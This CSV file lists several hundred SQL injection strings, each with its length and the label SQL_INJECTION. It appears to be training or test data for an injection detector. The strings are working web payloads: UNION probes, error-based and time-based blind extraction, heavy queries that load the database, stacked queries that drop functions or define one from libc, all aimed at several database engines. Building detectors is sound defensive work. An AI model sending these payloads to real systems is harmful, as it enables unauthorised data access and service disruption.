payload,length,label
"-8557 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",136,SQL_INJECTION
"-6368)) union all select 4646,4646,4646,4646,4646,4646,4646--",61,SQL_INJECTION
"1"") as crek where 6570=6570 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",168,SQL_INJECTION
"-7889"")) as oayf where 1765=1765 or 8571=8571--",47,SQL_INJECTION
"-6890"")) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((""ftho"" like ""ftho",125,SQL_INJECTION
"1%"")) union all select null,null,null,null,null,null,null,null--",64,SQL_INJECTION
1%' union all select null#,26,SQL_INJECTION
-7426' order by 1#,18,SQL_INJECTION
1%') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('%'=',214,SQL_INJECTION
"1%' union all select null,null,null,null--",42,SQL_INJECTION
"1')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ('ggiw'='ggiw",218,SQL_INJECTION
"1')) and 8635=(select count(*) from generate_series(1,5000000))--",65,SQL_INJECTION
"1') and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",79,SQL_INJECTION
"1)));select count(*) from generate_series(1,5000000)--",54,SQL_INJECTION
1'+(select tzvm where 5145=5145 and 4192=7437#,46,SQL_INJECTION
"-9462"") as vzga where 4799=4799 or 8691=1048",44,SQL_INJECTION
"1"")) as bovm where 5560=5560 union all select null,null,null,null,null,null,null#",81,SQL_INJECTION
1')));select (case when (1291=6612) then 1 else 1291*(select 1291 from master..sysdatabases) end)--,99,SQL_INJECTION
1))) and sleep(5)#,18,SQL_INJECTION
"1'||(select 'qstz' where 6835=6835;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",119,SQL_INJECTION
1';begin dbms_lock.sleep(5); end--,34,SQL_INJECTION
"(select 1 from generate_series(9352,9352,case when (9352=9352) then 1 else 0 end) limit 1)",90,SQL_INJECTION
"1"" where 8387=8387;select (case when (2751=8206) then 2751 else cast(1 as int)/(select 0 from dual) end) from dual--",116,SQL_INJECTION
"1%')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('%'='",205,SQL_INJECTION
"1)) as xyuy where 6894=6894;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",112,SQL_INJECTION
"1))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((9401=9401",177,SQL_INJECTION
"1%' and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",102,SQL_INJECTION
"1')) and make_set(8403=8403,8899) and (('bmsa'='bmsa",52,SQL_INJECTION
1')) rlike sleep(5) and (('tufg'='tufg,38,SQL_INJECTION
"1"") or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",98,SQL_INJECTION
"1"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""hrkf"" like ""hrkf",156,SQL_INJECTION
"1"") union all select null,null,null--",37,SQL_INJECTION
"1,(select (case when (5334=4976) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",96,SQL_INJECTION
"1"") where 7723=7723 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--",115,SQL_INJECTION
"1"") as yekp where 3049=3049 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",168,SQL_INJECTION
"1) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (7984=7984",187,SQL_INJECTION
1) and 8417=5276#,17,SQL_INJECTION
"-9749"" where 7083=7083 or make_set(7577=1182,1182)--",52,SQL_INJECTION
"1')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('uvlu'='uvlu",163,SQL_INJECTION
"1%')) and 2388=benchmark(5000000,md5(0x6d457153))#",50,SQL_INJECTION
"-5810 union all select 6307,6307,6307,6307,6307,6307,6307--",59,SQL_INJECTION
"1"") where 1392=1392 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",151,SQL_INJECTION
"-6400)) union all select 4650,4650,4650--",41,SQL_INJECTION
"-8695 union all select 6087,6087,6087,6087,6087,6087,6087,6087,6087,6087#",73,SQL_INJECTION
"1%')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('%'='",114,SQL_INJECTION
"1' where 9003=9003 and make_set(5868=8316,8316)--",49,SQL_INJECTION
"1"") as axua where 6718=6718;if(8264=1939) select 8264 else drop function nsoq--",79,SQL_INJECTION
1'||(select 'lvso' where 5675=5675;select case when 7717=7717 then 1 else null end--,84,SQL_INJECTION
"1%""))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((""%""=""",122,SQL_INJECTION
"1 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",188,SQL_INJECTION
"1"") as ufai where 9673=9673;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",124,SQL_INJECTION
"1)) as llnm where 6510=6510 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",90,SQL_INJECTION
-8028%'))) or 5042=5214,23,SQL_INJECTION
1)));select (case when (4636=1108) then 1 else 4636*(select 4636 from master..sysdatabases) end)--,98,SQL_INJECTION
-5694)) as cxnb where 6858=6858 or 9323=9323#,45,SQL_INJECTION
"-1550%""))) order by 1--",23,SQL_INJECTION
-6529') or (4309=1601)*1601,27,SQL_INJECTION
"-9166"") as hlre where 4768=4768 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",126,SQL_INJECTION
"1));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",95,SQL_INJECTION
1'||(select 'ucxp' where 6612=6612 order by 1--,47,SQL_INJECTION
"-1079"") where 2865=2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",86,SQL_INJECTION
"-3349' or elt(6610=4379,4379) and 'poqm' like 'poqm",51,SQL_INJECTION
"1'))) union all select null,null,null,null,null,null,null,null--",64,SQL_INJECTION
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('rjjo'='rjjo,202,SQL_INJECTION
1') waitfor delay '0:0:5' and ('vtfs'='vtfs,43,SQL_INJECTION
"1') where 2808=2808;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",104,SQL_INJECTION
"1'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('msol'='msol",122,SQL_INJECTION
"1');iif(1095=2853,1,1/0)",24,SQL_INJECTION
"1)) as dnwj where 2961=2961 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",168,SQL_INJECTION
"1"")) as yuqr where 7226=7226 and (select * from (select(sleep(5)))gcrr)#",72,SQL_INJECTION
"1""))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""fktl""=""fktl",221,SQL_INJECTION
1' in boolean mode);begin user_lock.sleep(5); end--,51,SQL_INJECTION
"-9698')) as qnjv where 3360=3360 or make_set(9354=9354,7185)--",62,SQL_INJECTION
"1""));select pg_sleep(5) and ((""qani""=""qani",42,SQL_INJECTION
"1 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",151,SQL_INJECTION
"-7794"") union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",75,SQL_INJECTION
"-1591 where 3291=3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",84,SQL_INJECTION
"1%')) or 8514=benchmark(5000000,md5(0x544d5a4c))#",49,SQL_INJECTION
"1'||(select 'jpso' from dual where 9357=9357 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'",203,SQL_INJECTION
(select (case when (9337=9337) then waitfor delay '0:0:5' else 9337*(select 9337 from master..sysdatabases) end)),113,SQL_INJECTION
"1"")) as osuh where 8809=8809;select (case when (9388=4322) then 1 else 9388*(select 9388 from master..sysdatabases) end)--",122,SQL_INJECTION
"1) union all select null,null,null--",36,SQL_INJECTION
"1') and elt(1210=1210,sleep(5)) and ('udvq'='udvq",49,SQL_INJECTION
1)) as beld where 1679=1679 or sleep(5)#,40,SQL_INJECTION
"1"" and 3824=benchmark(5000000,md5(0x76555642))",46,SQL_INJECTION
"1%"")) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((""%""=""",107,SQL_INJECTION
"1""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((""sfnj"" like ""sfnj",118,SQL_INJECTION
"1',iif(7475=7475,1,1/0)",23,SQL_INJECTION
"1"" where 9241=9241 union all select null#",41,SQL_INJECTION
"-3437) union all select 7774,7774,7774--",40,SQL_INJECTION
"1')));iif(7889=5114,1,1/0)",26,SQL_INJECTION
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",105,SQL_INJECTION
1' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'yvxg'='yvxg,222,SQL_INJECTION
-1910' or 2624=3371 and 'umoy'='umoy,36,SQL_INJECTION
"1') and 3824=benchmark(5000000,md5(0x76555642)) and ('seyd'='seyd",65,SQL_INJECTION
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",157,SQL_INJECTION
1')));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,103,SQL_INJECTION
"1') where 5799=5799 union all select null,null,null,null,null--",63,SQL_INJECTION
1')) and sleep(5) and (('krrr'='krrr,36,SQL_INJECTION
"1'||(select 'fwph' where 3791=3791;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",95,SQL_INJECTION
"1%';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and '%'='",95,SQL_INJECTION
1'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('eocx'='eocx,224,SQL_INJECTION
1))) or 4240=(select 4240 from pg_sleep(5))--,45,SQL_INJECTION
"1' where 5778=5778;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",86,SQL_INJECTION
"1')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('yzdp'='yzdp",179,SQL_INJECTION
"1"" and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",65,SQL_INJECTION
1' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and 'xnap'='xnap,79,SQL_INJECTION
-5918') as olzc where 5992=5992 or 4390=9085,44,SQL_INJECTION
"1"")) and (3020=3020)*6703 and ((""njdx"" like ""njdx",49,SQL_INJECTION
"1%')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('%'='",109,SQL_INJECTION
"1%"")));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",91,SQL_INJECTION
1 where 2384=2384 and (select * from (select(sleep(5)))gcrr)#,61,SQL_INJECTION
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (('uyft'='uyft",138,SQL_INJECTION
"-2962'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('hkjo'='hkjo",224,SQL_INJECTION
1'+(select dklj where 3265=3265;select sleep(5)#,48,SQL_INJECTION
"1""));waitfor delay '0:0:5' and ((""zili"" like ""zili",50,SQL_INJECTION
"1"")) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((""pebw"" like ""pebw",117,SQL_INJECTION
"1%' and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",111,SQL_INJECTION
"-3090"" or make_set(9354=9354,7185) and ""qowe"" like ""qowe",56,SQL_INJECTION
"1"") where 6311=6311;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",110,SQL_INJECTION
1')) as bewk where 3672=3672 or sleep(5)--,42,SQL_INJECTION
"1))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (((2230=2230",123,SQL_INJECTION
"1%""))) or 8156=(select count(*) from generate_series(1,5000000))--",66,SQL_INJECTION
"1"");select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (""yobb"" like ""yobb",121,SQL_INJECTION
"1%""))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""%""=""",79,SQL_INJECTION
"(select (case when (3531=3531) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 3531 end))",193,SQL_INJECTION
1'+(select ejaj where 1651=1651 or 6793=(select 6793 from pg_sleep(5)))+',73,SQL_INJECTION
"-4798""))) union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",77,SQL_INJECTION
"-9928"")) union all select 7511,7511,7511,7511,7511,7511,7511,7511#",66,SQL_INJECTION
1'+(select 'iyyv' where 9500=9500 or (select * from (select(sleep(5)))ydpu))+',78,SQL_INJECTION
"1%"");select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",88,SQL_INJECTION
"1' where 6721=6721 union all select null,null,null,null,null,null,null,null,null,null#",86,SQL_INJECTION
"-2748')) as gazw where 4624=4624 union all select 4624,4624#",60,SQL_INJECTION
"1'+(select 'lawc' where 1171=1171 or 8156=(select count(*) from generate_series(1,5000000))--",93,SQL_INJECTION
"-3270%' or elt(9404=3498,3498) and '%'='",40,SQL_INJECTION
-4324 order by 1--,18,SQL_INJECTION
1)) as ztcn where 1043=1043 and 6305=5785--,43,SQL_INJECTION
"1) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",64,SQL_INJECTION
-9212 or 1026=7967#,19,SQL_INJECTION
"1""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""atlz""=""atlz",130,SQL_INJECTION
"1)));select count(*) from generate_series(1,5000000) and (((1321=1321",69,SQL_INJECTION
"1%"") and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (""%""=""",105,SQL_INJECTION
1' in boolean mode) order by 1--,32,SQL_INJECTION
"1""));select count(*) from generate_series(1,5000000) and ((""bhmu"" like ""bhmu",76,SQL_INJECTION
"1) as iovi where 3910=3910 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",178,SQL_INJECTION
1') and 8594=(select 8594 from pg_sleep(5))--,45,SQL_INJECTION
"1))) or 8156=(select count(*) from generate_series(1,5000000))--",64,SQL_INJECTION
1'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('ykjs' like 'ykjs,262,SQL_INJECTION
"1""))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""blkt"" like ""blkt",201,SQL_INJECTION
"-4535') union all select 8491,8491,8491,8491,8491,8491--",56,SQL_INJECTION
1') where 5331=5331;begin dbms_lock.sleep(5); end--,51,SQL_INJECTION
"1') where 1363=1363 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",125,SQL_INJECTION
"-9014%') union all select 4211,4211,4211,4211,4211,4211#",56,SQL_INJECTION
1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('lnte'='lnte,224,SQL_INJECTION
"1%"") and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (""%""=""",90,SQL_INJECTION
1%'));select sleep(5)#,22,SQL_INJECTION
"-6629%""))) or 8571=8571--",25,SQL_INJECTION
"1')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('gydh'='gydh",114,SQL_INJECTION
"1"") union all select null,null,null,null,null#",46,SQL_INJECTION
"1"") as lgxc where 1117=1117 union all select null,null,null,null,null,null,null,null#",85,SQL_INJECTION
1%')) and sleep(5)#,19,SQL_INJECTION
"1') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)",133,SQL_INJECTION
"1')) as kdwc where 5906=5906 union all select null,null,null,null,null,null,null,null,null--",92,SQL_INJECTION
"1));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",91,SQL_INJECTION
"-8600"" or elt(1032=1032,3623) and ""kfsn"" like ""kfsn",51,SQL_INJECTION
"1 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)# urzg",146,SQL_INJECTION
"1' in boolean mode);select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",104,SQL_INJECTION
"1 where 2751=2751 union all select null,null,null,null--",56,SQL_INJECTION
"1%'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('%'='",169,SQL_INJECTION
"1""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""dnlz""=""dnlz",100,SQL_INJECTION
"-4707' union all select 4414,4414,4414,4414,4414,4414#",54,SQL_INJECTION
"-2500'))) union all select 6853,6853,6853,6853--",48,SQL_INJECTION
"1%"";begin dbms_lock.sleep(5); end--",35,SQL_INJECTION
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",100,SQL_INJECTION
"1""))) and elt(3114=3114,sleep(5))#",34,SQL_INJECTION
"1' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'aezm' like 'aezm",120,SQL_INJECTION
-6079))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((8708=8708,227,SQL_INJECTION
"-7923"")) or make_set(9354=9354,7185) and ((""szct""=""szct",55,SQL_INJECTION
"1',(case when 8260=8260 then 1 else null end)",45,SQL_INJECTION
"1%"")) and 8635=(select count(*) from generate_series(1,5000000))--",66,SQL_INJECTION
"1')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('holo'='holo",173,SQL_INJECTION
"1%"") or sleep(5) and (""%""=""",27,SQL_INJECTION
"1'||(select 'xhqy' where 4531=4531 union all select null,null--",63,SQL_INJECTION
"1' where 9381=9381;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",102,SQL_INJECTION
"1%') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ('%'='",145,SQL_INJECTION
"1') and make_set(8403=8403,8899) and ('ojag'='ojag",50,SQL_INJECTION
"1"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""kbex"" like ""kbex",129,SQL_INJECTION
"1') and elt(4249=4249,7259) and ('bkag'='bkag",45,SQL_INJECTION
"1 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))# dwxl",203,SQL_INJECTION
"-2704"") union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",71,SQL_INJECTION
"1%""));if(7899=7899) select 7899 else drop function zbbp--",57,SQL_INJECTION
-5880')) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('rwgl'='rwgl,207,SQL_INJECTION
1') where 3861=3861;select pg_sleep(5)--,40,SQL_INJECTION
"1) as zhvx where 3171=3171 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",158,SQL_INJECTION
"-7271'))) or make_set(9354=9354,7185) and ((('mdtw'='mdtw",57,SQL_INJECTION
"1%') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ('%'='",104,SQL_INJECTION
1 and 2006=2006,15,SQL_INJECTION
"-3441')) as dxvt where 9291=9291 union all select 9291,9291,9291#",65,SQL_INJECTION
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'imqi'='imqi",80,SQL_INJECTION
"1"" where 5477=5477;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",109,SQL_INJECTION
"1 where 2238=2238;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",78,SQL_INJECTION
"1"" where 4450=4450 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",80,SQL_INJECTION
"1%"")));begin user_lock.sleep(5); end--",38,SQL_INJECTION
(select (case when (9856=9856) then sleep(5) else 9856*(select 9856 from information_schema.character_sets) end)),113,SQL_INJECTION
"1""))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (((""mmsh""=""mmsh",116,SQL_INJECTION
-3598) union all select 2264#,29,SQL_INJECTION
"1%"") rlike sleep(5) and (""%""=""",30,SQL_INJECTION
"1%')) and elt(3114=3114,sleep(5))#",34,SQL_INJECTION
-3750'+(select alpu where 3911=3911 order by 1--,48,SQL_INJECTION
1');select case when 8975=2352 then 1 else null end--,53,SQL_INJECTION
1'||(select 'yhpe' where 8010=8010 rlike (select (case when (7910=3752) then 1 else 0x28 end)))||',98,SQL_INJECTION
"1"");select count(*) from generate_series(1,5000000)--",53,SQL_INJECTION
"1"" where 4082=4082 and elt(5699=1432,1432)--",44,SQL_INJECTION
"1))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((8018=8018",122,SQL_INJECTION
"1"")) as vgsb where 4747=4747;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",145,SQL_INJECTION
1)) order by 1--,16,SQL_INJECTION
-5774' where 3632=3632 or (3177=4222)*4222--,44,SQL_INJECTION
1);waitfor delay '0:0:5' and (4614=4614,39,SQL_INJECTION
"1 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",105,SQL_INJECTION
-4308') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('jmot'='jmot,205,SQL_INJECTION
1)) as pjkd where 1105=1105 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,228,SQL_INJECTION
"1"" where 1166=1166;select pg_sleep(5)--",39,SQL_INJECTION
"-4291"")) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""xyhi""=""xyhi",222,SQL_INJECTION
"-9751""))) or 5929=3884--",24,SQL_INJECTION
"1%"") and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""%""=""",186,SQL_INJECTION
"1"" and 9198=9198--",18,SQL_INJECTION
-8812 or 6872=6872# dflr,24,SQL_INJECTION
"1%' and 8407=(select count(*) from generate_series(1,5000000)) and '%'='",72,SQL_INJECTION
"1"") where 6255=6255 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",111,SQL_INJECTION
"1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",159,SQL_INJECTION
"-4929"" where 6381=6381 or 8571=8571--",37,SQL_INJECTION
1' where 3337=3337 and 8403=5760,32,SQL_INJECTION
"-9398' union all select 3998,3998,3998,3998,3998,3998,3998,3998,3998#",69,SQL_INJECTION
"1',(select (case when (2073=5314) then 1 else 1/(select 0) end))",64,SQL_INJECTION
"1') as bfgl where 8959=8959 union all select null,null,null,null,null,null,null,null,null,null--",96,SQL_INJECTION
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('gfln'='gfln",113,SQL_INJECTION
"1') as jwch where 4609=4609;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",115,SQL_INJECTION
"-6815 where 7609=7609 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",152,SQL_INJECTION
